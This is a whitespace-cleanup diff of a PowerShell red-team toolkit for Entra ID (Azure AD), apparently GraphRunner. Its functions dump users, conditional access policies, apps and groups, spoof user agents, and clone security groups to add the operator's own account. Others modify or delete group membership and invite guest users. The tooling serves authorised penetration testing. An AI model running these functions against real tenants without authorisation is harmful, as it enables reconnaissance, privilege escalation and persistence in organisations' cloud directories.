         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Gather the full list of users from the directory.
 
     .PARAMETER Tokens
@@ -2968,12 +3078,12 @@ Function Get-AzureADUsers{
     .PARAMETER OutFile
 
         File to output the results to
-    
+
     .EXAMPLE
-        
+
         C:\PS> Get-AzureADUsers -Tokens $tokens -OutFile users.txt
         -----------
-        This will dump all Azure AD users to a text file called users.txt 
+        This will dump all Azure AD users to a text file called users.txt
 
     #>
     param(
@@ -2989,7 +3099,7 @@ Function Get-AzureADUsers{
     [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
     [String]$Browser = "Edge",
     [Parameter(Mandatory=$False)]
-    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",  
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
     [Parameter(Mandatory = $true)]
     [string]
     $outfile = "AzureADUsers.log",
@@ -3007,8 +3117,8 @@ Function Get-AzureADUsers{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -3029,11 +3139,11 @@ Function Get-AzureADUsers{
         }catch {
 		if($_.Exception.Response.StatusCode.value__ -match "429"){
                 Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
-                Start-Sleep -Seconds 5 
+                Start-Sleep -Seconds 5
                 }
 	}
 	$out = $request.Content | ConvertFrom-Json
-        $userlist += $out.value.userPrincipalName 
+        $userlist += $out.value.userPrincipalName
         if ($out.'@odata.nextLink') {
             if(!$GraphRun){
             Write-Host "[*] Gathering more users..."
@@ -3065,19 +3175,19 @@ Function Invoke-DumpCAPS{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-       Tool for dumping conditional access policies       
-    
+
+       Tool for dumping conditional access policies
+
     .PARAMETER Tokens
-        
+
         Token object for auth
-    
+
     .PARAMETER ResolveGuids
-        
+
         Switch to resolve user and group guids if wanted
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-DumpCAPS -ResolveGuids
         Description
         -----------
@@ -3090,7 +3200,7 @@ Function Invoke-DumpCAPS{
         Description
         -----------
         Use a previously authenticated refresh token to dump CAPS
-    
+
 #>
 
 
@@ -3123,8 +3233,8 @@ Function Invoke-DumpCAPS{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -3179,7 +3289,7 @@ Function Invoke-DumpCAPS{
         $continue = "authorization_pending"
         while($continue)
             {
-    
+
         $body=@{
             "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
             "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
@@ -3199,7 +3309,7 @@ Function Invoke-DumpCAPS{
                 break
             }
         Start-Sleep -Seconds 3
-        }   
+        }
     }
 
     $tokenPayload = $aadtokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
@@ -3217,7 +3327,7 @@ Function Invoke-DumpCAPS{
 
     $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
     $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
-    $parsedjson = $CAPS 
+    $parsedjson = $CAPS
     if(!$GraphRun){
         Write-Host -ForegroundColor Yellow "[*] Now dumping conditional access policies from the tenant."
     }
@@ -3229,7 +3339,7 @@ Function Invoke-DumpCAPS{
         if ($policyType -eq "18"){
             # Process the PolicyDetail field
             $policyState = $policyDetail.State
-            $conditionspreformat = $policyDetail.Conditions 
+            $conditionspreformat = $policyDetail.Conditions
             $controls = $policyDetail.Controls.Control -join ", "
 
             # Print the policy details
@@ -3253,7 +3363,7 @@ Function Invoke-DumpCAPS{
 
                             foreach ($includeData in $conditionData.$includeExclude) {
                                 $includeType = $includeData.PSObject.Properties.Name
-                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
+                                $includeValues = $includeData.PSObject.Properties.Value -split ', '
                                 $resolvedUsers = @()
                                 if($ResolveGuids){
                                     foreach ($guid in $includeValues) {
@@ -3303,7 +3413,7 @@ Function Invoke-DumpCAPS{
 
                             foreach ($includeData in $conditionData.$includeExclude) {
                                 $includeType = $includeData.PSObject.Properties.Name
-                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
+                                $includeValues = $includeData.PSObject.Properties.Value -split ', '
                                 $resolvedUsers = @()
                                 if($ResolveGuids){
                                     foreach ($guid in $includeValues) {
@@ -3333,11 +3443,11 @@ Function Invoke-DumpCAPS{
                     $formattedCondition = "`t$conditionType :`n$conditionText"
                     $formattedCondition
                 }
-    
+
                 Write-Output "Controls: $controls"
             }
             # Separator
-            Write-Output ("=" * 80) 
+            Write-Output ("=" * 80)
         }
     }
 }
@@ -3373,11 +3483,11 @@ Function Invoke-DumpApps{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
            Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Invoke-DumpApps -Tokens $tokens
     #>
 
@@ -3397,11 +3507,11 @@ Function Invoke-DumpApps{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -3415,8 +3525,8 @@ Function Invoke-DumpApps{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token   
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
     if(!$GraphRun){
         Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
     }
@@ -3443,7 +3553,7 @@ Function Invoke-DumpApps{
         if ($jsonData.'@odata.nextLink') {
             $initialUrl = $jsonData.'@odata.nextLink'
         } else {
-       
+
             break
         }
     } while ($true)
@@ -3470,7 +3580,7 @@ Function Invoke-DumpApps{
     $appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }
 
     # Separator
-                Write-Output ("=" * 80) 
+                Write-Output ("=" * 80)
 
     # Loop through each app registration
     foreach ($app in $appRegistrations.value) {
@@ -3478,11 +3588,11 @@ Function Invoke-DumpApps{
         $appName = $app.displayName
         $createtime = $app.createdDateTime
         $signinaudience = $app.signInAudience
-    
+
         # Query users who have consented to the app's permissions
         $approleurl = ($graphApiUrl + "/servicePrincipals(appId='" + $appId + "')/appRoleAssignedTo")
         $consentedUsers = Invoke-RestMethod -Uri $approleurl -Headers @{ Authorization = "Bearer $accessToken" }
-    
+
         # Display app information and consented users
         Write-Output "App Name: $appName (App ID: $appId)"
         Write-Output "Creation Date: $createtime"
@@ -3501,7 +3611,7 @@ Function Invoke-DumpApps{
             # Loop through each resource access item
             foreach ($accessItem in $resourceAccess.resourceAccess) {
                 $scopeGuid = $accessItem.id
-            
+
                 # Use the spn list to find names of permissions
                 foreach($approle in $spnsjson.appRoles){
                     if ($scopeGuid -like $approle.id) {
@@ -3527,12 +3637,12 @@ Function Invoke-DumpApps{
         }
         Write-Output ""
         # Separator
-                Write-Output ("=" * 80) 
-    } 
+                Write-Output ("=" * 80)
+    }
             if(!$GraphRun){
             Write-Host -ForegroundColor yellow "[*] Now looking for external apps. Any apps displayed below are not owned by the current tenant or Microsoft's main app tenant."
             }
-            Write-Output ("=" * 80) 
+            Write-Output ("=" * 80)
 
             $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
             $tenantid = $orginfo.value.id
@@ -3573,8 +3683,8 @@ Function Invoke-DumpApps{
 
                 $unsupAdminfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=Admin&userObjectId=")
                 $EntAppsAdminScope = Invoke-RestMethod -Method GET -Uri $unsupAdminfullurl -Headers $unsupheaders
-            
-            
+
+
 
                 Write-Output ("External App: " + $serviceprincipal.displayName)
                 Write-Output ("AppId: " + $serviceprincipal.AppId)
@@ -3599,9 +3709,9 @@ Function Invoke-DumpApps{
                 Write-Output ($Entscopeadminitem.permissionId + ", " + $Entscopeadminitem.permissionType + ", " + $($principals -join '; '))
                 }
                 Write-Output ""
-                Write-Output ("=" * 80) 
+                Write-Output ("=" * 80)
             }
-        
+
         }
 }
 
@@ -3611,14 +3721,14 @@ function Get-SecurityGroups{
     <#
     .SYNOPSIS
 
-        Gather the security groups and members from the directory.        
+        Gather the security groups and members from the directory.
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Gather the security groups and members from the directory.
 
     .PARAMETER AccessToken
@@ -3630,7 +3740,7 @@ function Get-SecurityGroups{
         The path to the CSV file where the security groups will be exported.
 
     .EXAMPLE
-        
+
         C:\PS> Get-SecurityGroups -Tokens $tokens -OutputFile "security_groups.csv"
         -----------
         This will dump all security groups to the specified CSV file.
@@ -3652,7 +3762,7 @@ function Get-SecurityGroups{
         [ValidateSet("Yammer", "Outlook", "MSTeams", "Graph", "AzureCoreManagement", "AzureManagement", "MSGraph", "DODMSGraph", "Custom", "Substrate")]
         [String[]] $Client = "MSGraph",
         [Parameter(Mandatory = $False)]
-        [String] $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+        [String] $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
         [Parameter(Mandatory = $False)]
         [String] $Resource = "https://graph.microsoft.com",
         [Parameter(Mandatory = $False)]
@@ -3691,25 +3801,25 @@ function Get-SecurityGroups{
             }
         }
     }
-    
+
     $accessToken = $tokens.access_token
     [string]$refreshToken = $tokens.refresh_token
     $headers = @{
         Authorization = "Bearer $accessToken"
     }
-    
+
     if (!$GraphRun) {
         Write-Host -ForegroundColor Yellow "[*] Retrieving a list of security groups and their members from the directory..."
     }
-    
+
     $graphApiUrl = "https://graph.microsoft.com/v1.0"
     $groupsUrl = "$graphApiUrl/groups?$filter=securityEnabled eq true"
-    
+
     $groupsWithMemberIDs = @()
     $startTime = Get-Date
     $refresh_Interval = [TimeSpan]::FromSeconds($RefreshInterval)
 
-    
+
     do {
         try {
             $groupsResponse = Invoke-RestMethod -Uri $groupsUrl -Headers $headers -Method Get
@@ -3731,10 +3841,10 @@ function Get-SecurityGroups{
                 Write-Host -ForegroundColor Yellow "[*] Resuming script..."
                 $startTime = Get-Date
             }
-            
+
             $groupId = $group.id
             $membersUrl = "$graphApiUrl/groups/$groupId/members"
-    
+
             try {
                 $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
                 $members = $membersResponse.value
@@ -3746,21 +3856,21 @@ function Get-SecurityGroups{
                     Write-Host -ForegroundColor Red "[*] An error occurred while retrieving members for group $($group.displayName): $($_.Exception.Message)"
                 }
             }
-    
+
             $memberIds = $members | ForEach-Object { $_.id }
-    
+
             $groupInfo = @{
                 GroupName = $group.displayName
                 MemberIds = $memberIds -join ","
             }
-    
+
             Write-Output ("Group Name: " + $group.displayName + " | Group ID: " + $groupId)
             Write-Output ("Members: " + ($($members.userPrincipalName) -join ', '))
             Write-Output ""
             Write-Output ("=" * 80)
             $groupsWithMemberIDs += New-Object PSObject -Property $groupInfo
         }
-    
+
         if ($groupsResponse.'@odata.nextLink') {
             $groupsUrl = $groupsResponse.'@odata.nextLink'
             if (!$GraphRun) {
@@ -3770,7 +3880,7 @@ function Get-SecurityGroups{
             $groupsUrl = $null
         }
     } while ($groupsUrl)
-    
+
     if ($OutputFile) {
         # Export security groups to a CSV file
         $groupsWithMemberIDs | Export-Csv -Path $OutputFile -NoTypeInformation
@@ -3835,7 +3945,7 @@ function Invoke-DeleteGroup {
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         Deletes an Entra ID (AzureAD) group
 
     .PARAMETER Tokens
@@ -3843,14 +3953,14 @@ function Invoke-DeleteGroup {
         Token object for auth
 
     .PARAMETER GroupId
-    
-        The object ID of the group you want to delete 
-               
-    .EXAMPLES      
-        
+
+        The object ID of the group you want to delete
+
+    .EXAMPLES
+
         C:\PS> Invoke-DeleteGroup -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9
     #>
-    
+
     param (
         [string]
         $groupId,
@@ -3863,11 +3973,11 @@ function Invoke-DeleteGroup {
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -3881,8 +3991,8 @@ function Invoke-DeleteGroup {
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
 
     $url = "https://graph.microsoft.com/v1.0/groups/$groupId"
@@ -3912,11 +4022,11 @@ function Invoke-SecurityGroupCloner{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
            Clones a security group in Azure Active Directory and allows you to add your own account.
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Invoke-SecurityGroupCloner -Tokens $tokens
     #>
 
@@ -3931,11 +4041,11 @@ function Invoke-SecurityGroupCloner{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -3949,8 +4059,8 @@ function Invoke-SecurityGroupCloner{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
     $headers = @{
         Authorization = "Bearer $accessToken"
@@ -3961,7 +4071,7 @@ function Invoke-SecurityGroupCloner{
     $CloneGroup = ""
     while($CloneGroup -eq ""){
     Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
-    $CloneGroup = Read-Host 
+    $CloneGroup = Read-Host
 
     if ($secgroups.GroupName -contains $CloneGroup) {
         Write-Host -ForegroundColor yellow ("[*] Found group " + $CloneGroup)
@@ -3981,7 +4091,7 @@ function Invoke-SecurityGroupCloner{
         }
     }
     Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
-    $answer = Read-Host 
+    $answer = Read-Host
     $answer = $answer.ToLower()
     if ($answer -eq "yes" -or $answer -eq "y") {
         Write-Host -ForegroundColor yellow "[*] Adding current user to the cloned group..."
@@ -3994,11 +4104,11 @@ function Invoke-SecurityGroupCloner{
     }
 
     Write-Host -ForegroundColor Cyan "[*] Do you want to add a different user to the cloned group? (Yes/No)"
-    $difanswer = Read-Host 
+    $difanswer = Read-Host
     $difanswer = $difanswer.ToLower()
     if ($difanswer -eq "yes" -or $difanswer -eq "y") {
         Write-Host -ForegroundColor Cyan "[*] What is the email address of the user you want to add?"
-        $useranswer = Read-Host 
+        $useranswer = Read-Host
         $useranswer = $useranswer.ToLower()
         Write-Host -ForegroundColor yellow "[*] Adding $useranswer to the cloned group..."
         $uri = "https://graph.microsoft.com/v1.0/users"
@@ -4013,7 +4123,7 @@ function Invoke-SecurityGroupCloner{
     }
 
     Write-Host -ForegroundColor Cyan "[*] Do you want to change the group name: ($CloneGroup)? (Yes/No)"
-    $groupanswer = Read-Host 
+    $groupanswer = Read-Host
     $groupanswer = $groupanswer.ToLower()
     if ($groupanswer -eq "yes" -or $groupanswer -eq "y") {
         Write-Host -ForegroundColor yellow "[*] What do you want the group name to be?"
@@ -4041,13 +4151,13 @@ function Get-UpdatableGroups{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
            Finds groups that can be updated by the current user. For example, if this reports any updatable groups then it may be possible to add new users to the reported group(s).
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Get-UpdatableGroups -Tokens $tokens
-            C:\PS> Get-UpdatableGroups -Tokens $tokens -Client Custom -ClientID "cb1056e2-e479-49de-ae31-7812af012ed8" -Resource "https://graph.microsoft.com/ -Device AndroidMobile -Browser Android 
+            C:\PS> Get-UpdatableGroups -Tokens $tokens -Client Custom -ClientID "cb1056e2-e479-49de-ae31-7812af012ed8" -Resource "https://graph.microsoft.com/ -Device AndroidMobile -Browser Android
     #>
 
     Param(
@@ -4070,7 +4180,7 @@ function Get-UpdatableGroups{
         $Client = "MSGraph",
         [Parameter(Mandatory=$False)]
         [String]
-        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
         [Parameter(Mandatory=$False)]
         [String]
         $Resource = "https://graph.microsoft.com",
@@ -4132,7 +4242,7 @@ function Get-UpdatableGroups{
                         }
                         Write-Host -ForegroundColor Yellow "[*] Resuming script..."
                         $startTime = Get-Date
-                    }  
+                    }
 
                     $groupid = ("/" + $group.id)
                     $requestBody = @{
@@ -4211,11 +4321,11 @@ function Get-DynamicGroups{
             Optional Dependencies: None
 
         .DESCRIPTION
-        
+
             Finds groups that use dynamic membership.
 
-        .EXAMPLES      
-        
+        .EXAMPLES
+
             C:\PS> Get-DynamicGroups -Tokens $tokens
     #>
 
@@ -4230,11 +4340,11 @@ function Get-DynamicGroups{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -4248,8 +4358,8 @@ function Get-DynamicGroups{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
 
     $graphApiEndpoint = "https://graph.microsoft.com/v1.0/groups"
@@ -4270,9 +4380,9 @@ function Get-DynamicGroups{
             }catch {
                 if($_.Exception.Response.StatusCode.value__ -match "429"){
                 Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
-                Start-Sleep -Seconds 5 
+                Start-Sleep -Seconds 5
                 }
-                
+
             }
             foreach ($group in $response.value) {
                 $groupid = ("/" + $group.id)
@@ -4301,7 +4411,7 @@ function Get-DynamicGroups{
                     }
                 }
             }
-            
+
             # Check if there are more pages of results
             if ($response.'@odata.nextLink') {
                 $graphApiEndpoint = $response.'@odata.nextLink'
@@ -4328,7 +4438,7 @@ function Get-DynamicGroups{
 
 }
 function Invoke-AddGroupMember {
-    
+
     <#
     .SYNOPSIS
         Adds a member object ID to a group
@@ -4338,7 +4448,7 @@ function Invoke-AddGroupMember {
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         Adds a member object ID to a group
 
     .PARAMETER Tokens
@@ -4346,18 +4456,18 @@ function Invoke-AddGroupMember {
         Token object for auth
 
     .PARAMETER GroupId
-    
-        The object ID of the group you want to modify 
-        
+
+        The object ID of the group you want to modify
+
     .PARAMETER UserId
-    
+
         The ID of the object that you want to add to the group
-        
-    .EXAMPLES      
-        
+
+    .EXAMPLES
+
         C:\PS> Invoke-AddGroupMember -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9 -userId 7a3d8bfe-e4c7-46c0-93ec-ef2b1c8a0b4a
     #>
-    
+
     param (
         [string]
         $groupId,
@@ -4372,11 +4482,11 @@ function Invoke-AddGroupMember {
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -4390,8 +4500,8 @@ function Invoke-AddGroupMember {
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
     $url = ("https://graph.microsoft.com/v1.0/groups/$groupId/members/" + '$ref')
 
@@ -4415,7 +4525,7 @@ function Invoke-AddGroupMember {
 
 
 function Invoke-RemoveGroupMember {
-    
+
     <#
     .SYNOPSIS
         Removes a member object ID from a group
@@ -4425,7 +4535,7 @@ function Invoke-RemoveGroupMember {
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         Removes a member object ID from a group
 
     .PARAMETER Tokens
@@ -4433,18 +4543,18 @@ function Invoke-RemoveGroupMember {
         Token object for auth
 
     .PARAMETER GroupId
-    
-        The object ID of the group you want to modify 
-        
+
+        The object ID of the group you want to modify
+
     .PARAMETER UserId
-    
+
         The ID of the object that you want to remove from the group
-        
-    .EXAMPLES      
-        
+
+    .EXAMPLES
+
         C:\PS> Invoke-RemoveGroupMember -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9 -userId 7a3d8bfe-e4c7-46c0-93ec-ef2b1c8a0b4a
     #>
-    
+
     param (
         [string]
         $groupId,
@@ -4459,11 +4569,11 @@ function Invoke-RemoveGroupMember {
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -4477,8 +4587,8 @@ function Invoke-RemoveGroupMember {
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
 
     $url = ("https://graph.microsoft.com/v1.0/groups/$groupId/members/" + $userid + '/$ref')
 
@@ -4500,34 +4610,34 @@ function Invoke-RemoveGroupMember {
 function Get-EntraIDGroupInfo {
     <#
     .SYNOPSIS
-        A function to retrieve group information 
+        A function to retrieve group information
         Author: Beau Bullock (@dafthack)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        A function to retrieve group information 
+
+        A function to retrieve group information
 
     .PARAMETER Tokens
 
         File path to a text file with group names and guids exported from Get-UpdatableGroups
 
     .PARAMETER GroupList
-    
-        The object ID of the group you want to modify 
-        
+
+        The object ID of the group you want to modify
+
     .PARAMETER GroupName
-    
+
         A specific group name to lookup
 
     .PARAMETER GroupGUID
 
         A specific group guid to lookup
-        
-    .EXAMPLES      
-        
+
+    .EXAMPLES
+
         C:\PS> Get-EntraIDGroupInfo -Tokens $tokens -GroupList .\updatable-groups-output.txt
 
     .EXAMPLES
@@ -4553,11 +4663,11 @@ function Get-EntraIDGroupInfo {
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -4571,9 +4681,9 @@ function Get-EntraIDGroupInfo {
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
-    [string]$refreshToken = $tokens.refresh_token 
-  
+    $accesstoken = $tokens.access_token
+    [string]$refreshToken = $tokens.refresh_token
+
     $headers = @{
         'Authorization' = "Bearer $accesstoken"
     }
@@ -4600,7 +4710,7 @@ function Get-EntraIDGroupInfo {
 
 function Invoke-GroupLookup{
     param(
-    $headers,         
+    $headers,
     [string]$groupurl
     )
     try {
@@ -4611,7 +4721,7 @@ function Invoke-GroupLookup{
     }
     if($response.value.count -gt 1){
         foreach($group in $response.value){
-            Write-Host "Group Name: $($group.displayName)" 
+            Write-Host "Group Name: $($group.displayName)"
             Write-Host "Group ID: $($group.id)"
             if ($group.groupTypes -match "Unified"){
                 Write-Host "Group Type: Microsoft 365 Group"
@@ -4620,31 +4730,31 @@ function Invoke-GroupLookup{
                 Write-Host "Group Type: Security or Distribution Group"
             }
             if ($group.securityEnabled){
-                Write-Host "Security Enabled: $($group.securityEnabled)" 
+                Write-Host "Security Enabled: $($group.securityEnabled)"
             }
             if ($group.visibility){
-                Write-Host "Visibility: $($group.visibility)" 
+                Write-Host "Visibility: $($group.visibility)"
             }
             if ($group.onPremisesSyncEnabled){
-                Write-Host "OnPrem Sync Enabled: $($group.onPremisesSyncEnabled)" 
+                Write-Host "OnPrem Sync Enabled: $($group.onPremisesSyncEnabled)"
                 Write-Host "OnPrem Domain Name: $($group.onPremisesDomainName)"
                 Write-Host "OnPrem NetBIOS Name: $($group.onPremisesNetBiosName)"
                 Write-Host "OnPrem SAM Account Name: $($group.onPremisesSamAccountName)"
             }
             if ($group.isAssignableToRole){
-                Write-Host "Role-Assignable: $($group.isAssignableToRole)" 
+                Write-Host "Role-Assignable: $($group.isAssignableToRole)"
             }
             if ($group.resourceProvisioningOptions){
-                Write-Host "Provisioning Options: $($group.resourceProvisioningOptions -join ', ')" 
+                Write-Host "Provisioning Options: $($group.resourceProvisioningOptions -join ', ')"
             }
             if ($group.resourceBehaviorOptions){
-                Write-Host "Behavior Options: $($group.resourceBehaviorOptions -join ',')" 
+                Write-Host "Behavior Options: $($group.resourceBehaviorOptions -join ',')"
             }
             Write-Host "-----------------------------"
         }
     }
     else{
-        Write-Host "Group Name: $($response.displayName)" 
+        Write-Host "Group Name: $($response.displayName)"
         Write-Host "Group ID: $($response.id)"
         if ($response.groupTypes -match "Unified"){
             Write-Host "Group Type: Microsoft 365 Group"
@@ -4653,25 +4763,25 @@ function Invoke-GroupLookup{
             Write-Host "Group Type: Security or Distribution Group"
         }
         if ($response.securityEnabled){
-            Write-Host "Security Enabled: $($response.securityEnabled)" 
+            Write-Host "Security Enabled: $($response.securityEnabled)"
         }
         if ($response.visibility){
-            Write-Host "Visibility: $($response.visibility)" 
+            Write-Host "Visibility: $($response.visibility)"
         }
         if ($response.onPremisesSyncEnabled){
-            Write-Host "OnPrem Sync Enabled: $($response.onPremisesSyncEnabled)" 
+            Write-Host "OnPrem Sync Enabled: $($response.onPremisesSyncEnabled)"
             Write-Host "OnPrem Domain Name: $($response.onPremisesDomainName)"
             Write-Host "OnPrem NetBIOS Name: $($response.onPremisesNetBiosName)"
             Write-Host "OnPrem SAM Account Name: $($response.onPremisesSamAccountName)"
         }
         if ($response.isAssignableToRole){
-            Write-Host "Role-Assignable: $($response.isAssignableToRole)" 
+            Write-Host "Role-Assignable: $($response.isAssignableToRole)"
         }
         if ($response.resourceProvisioningOptions){
-            Write-Host "Provisioning Options: $($response.resourceProvisioningOptions -join ', ')" 
+            Write-Host "Provisioning Options: $($response.resourceProvisioningOptions -join ', ')"
         }
         if ($response.resourceBehaviorOptions){
-            Write-Host "Behavior Options: $($response.resourceBehaviorOptions -join ',')" 
+            Write-Host "Behavior Options: $($response.resourceBehaviorOptions -join ',')"
         }
         Write-Host "-----------------------------"
     }
@@ -4689,7 +4799,7 @@ function Invoke-InviteGuest{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         Invites a guest user to an Azure Active Directory tenant.
 
     .PARAMETER Tokens
@@ -4697,27 +4807,27 @@ function Invoke-InviteGuest{
         Token object for auth
 
     .PARAMETER DisplayName
-    
-        The name you want displayed in the Azure directory for the user (ex. "Beau Bullock")
-        
